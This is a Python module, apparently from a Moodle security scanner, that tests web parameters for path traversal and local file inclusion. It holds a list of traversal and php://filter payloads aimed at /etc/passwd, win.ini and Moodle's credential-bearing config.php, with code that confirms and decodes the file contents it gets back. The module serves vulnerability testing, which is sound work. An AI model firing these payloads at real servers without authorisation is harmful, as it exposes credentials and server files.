#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Path-traversal / local file inclusion checks with file signatures.

No finding is emitted for error messages or for a reflected payload.  A
finding requires the actual contents of a known file (``/etc/passwd``,
``win.ini`` or Moodle's ``config.php``) to be returned.
"""

from __future__ import annotations

import base64
import logging
import re
from typing import Any, Dict, List, Optional

from modules.discovery import (
    discover_parameter_targets,
    replace_query_param,
    send_parameter,
)

_LFI_PARAMETERS = {
    "file",
    "page",
    "path",
    "dir",
    "download",
    "include",
    "read",
    "content",
    "document",
    "folder",
    "root",
    "source",
    "template",
    "theme",
    "plugin",
    "view",
    "show",
    "name",
    "url",
    "redirect",
    "return",
    "returnurl",
    "wantsurl",
    "cat",
    "detail",
    "location",
}

_PAYLOADS = (
    "../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\Windows\\win.ini",
    "../../../../../../../../Windows/win.ini",
    "../../../../config.php",
    "../../../../../config.php",
    "php://filter/convert.base64-encode/resource=../../config.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/read=convert.base64-encode/resource=../../config.php",
)

_B64_RE = re.compile(r"[A-Za-z0-9+/=]{40,}")


class MoodleLFITester:
    def __init__(
        self,
        target_url: str,
        logger: Optional[logging.Logger] = None,
        timeout: int = 30,
        proxy: Optional[str] = None,
        cookies: Optional[Dict[str, str]] = None,
        delay: float = 0,
        user_agent: Optional[str] = None,
        verify_ssl: bool = True,
        session=None,
        deep: bool = False,
        max_tests: int = 20,
        crawl_pages: int = 0,
        **_: Any,
    ) -> None:
        self.target_url = target_url.rstrip("/") + "/"
        self.timeout = timeout
        self.deep = deep
        self.max_tests = max(1, max_tests if deep else min(max_tests, 25))
        self.crawl_pages = max(0, int(crawl_pages or 0))
        self.version_info: Dict[str, Any] = {}
        self.logger = logger or logging.getLogger("MoodleLFITester")
        if session is None:
            from modules.http import build_session

            session = build_session(
                verify_ssl=verify_ssl,
                timeout=timeout,
                user_agent=user_agent,
                proxy=proxy,
                cookies=cookies,
            )
        self.session = session

    def set_version_info(self, version_info: Dict[str, Any]) -> None:
        self.version_info = version_info or {}

    def run_tests(self) -> Dict[str, List[Dict[str, Any]]]:
        results: Dict[str, List[Dict[str, Any]]] = {"vulnerabilities": [], "info": []}
        targets = discover_parameter_targets(
            self.session,
            self.target_url,
            timeout=self.timeout,
            logger=self.logger,
            include_hidden_ids=False,
            crawl_pages=self.crawl_pages,
        )
        likely = [target for target in targets if target["parameter"].lower() in _LFI_PARAMETERS]
        candidates = likely or targets

        tested = 0
        reported = set()
        for target in candidates[: self.max_tests]:
            tested += 1
            finding = self._test_target(target)
            if finding:
                key = (target["url"], target["parameter"])
                if key not in reported:
                    results["vulnerabilities"].append(finding)
                    reported.add(key)

        results["info"].append(
            self._info(
                "LFI: resumo",
                f"Testados {tested} parâmetros com assinaturas de ficheiros reais. "
                "Erros de PHP e reflexão de payload não são reportados como LFI.",
            )
        )
        return results

    def _test_target(self, target: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        for payload in _PAYLOADS:
            response = send_parameter(self.session, target, payload, timeout=self.timeout)
            if response is None or response.status_code != 200:
                continue
            body = response.text or ""
            confirmation = self._confirm_file_read(body, payload)
            if not confirmation:
                continue
            title, severity, evidence, cwe = confirmation
            finding_url = (
                replace_query_param(target["url"], target["parameter"], payload)
                if target["method"] == "get"
                else target["url"]
            )
            return {
                "title": title,
                "description": (
                    f"O parâmetro '{target['parameter']}' permitiu ler um ficheiro "
                    "do servidor. Isto pode expor credenciais e código-fonte."
                ),
                "severity": severity,
                "confidence": "high",
                "evidence": (
                    f"Parâmetro: {target['parameter']}\n"
                    f"URL: {finding_url} ({target['method'].upper()})\n"
                    f"Payload: {payload}\n{evidence}"
                ),
                "payload": payload,
                "url": finding_url,
                "remediation": (
                    "Nunca usar entrada do utilizador em include/readfile; usar "
                    "whitelists, canonicalização de caminho e open_basedir."
                ),
                "cwe": cwe,
                "verified": True,
                "source": "active",
                "evidence_type": "active",
                "metadata": {"parameter": target["parameter"], "method": target["method"].upper()},
            }
        return None

    def _confirm_file_read(self, body: str, payload: str):
        if "/etc/passwd" in payload:
            match = re.search(r"root:[^:\n]*:0:0:[^\n]*", body)
            if match:
                return (
                    "Local File Inclusion: /etc/passwd",
                    "High",
                    f"Assinatura encontrada: {match.group(0)[:120]}",
                    "CWE-22",
                )
            return None

        if "win.ini" in payload or "Windows/win.ini" in payload:
            if "[fonts]" in body.lower() or "[extensions]" in body.lower():
                return (
                    "Local File Inclusion: win.ini",
                    "High",
                    "Assinatura [fonts]/[extensions] encontrada no corpo.",
                    "CWE-22",
                )
            return None

        if "config.php" in payload:
            if self._looks_like_moodle_config(body):
                return (
                    "Local File Inclusion: config.php do Moodle",
                    "Critical",
                    "O corpo contém código PHP de configuração do Moodle ($CFG/dbtype/dbuser).",
                    "CWE-98",
                )
            decoded = self._decode_longest_base64(body)
            if decoded and self._looks_like_moodle_config(decoded):
                return (
                    "Local File Inclusion: config.php do Moodle",
                    "Critical",
                    "O corpo continha config.php codificado em base64; a "
                    "decodificação confirmou $CFG/dbtype/dbuser.",
                    "CWE-98",
                )
        return None

    @staticmethod
    def _looks_like_moodle_config(text: str) -> bool:
        if "<?php" not in text:
            return False
        keys = ("$CFG", "dbtype", "dbuser", "dbpass", "dbname", "dblibrary", "wwwroot")
        return sum(1 for key in keys if key in text) >= 2

    @staticmethod
    def _decode_longest_base64(text: str) -> Optional[str]:
        # php://filter emits base64 wrapped at 76 characters; remove whitespace
        # before looking for the longest encoded blob.
        compact = re.sub(r"\s+", "", text or "")
        best = ""
        for match in _B64_RE.finditer(compact):
            if len(match.group(0)) > len(best):
                best = match.group(0)
        if not best:
            return None
        try:
            return base64.b64decode(best + "=" * (-len(best) % 4)).decode("utf-8", errors="replace")
        except Exception:
            return None

    @staticmethod
    def _info(title: str, description: str) -> Dict[str, Any]:
        return {
            "title": title,
            "description": description,
            "severity": "Info",
            "verified": True,
            "source": "active",
            "evidence_type": "info",
        }
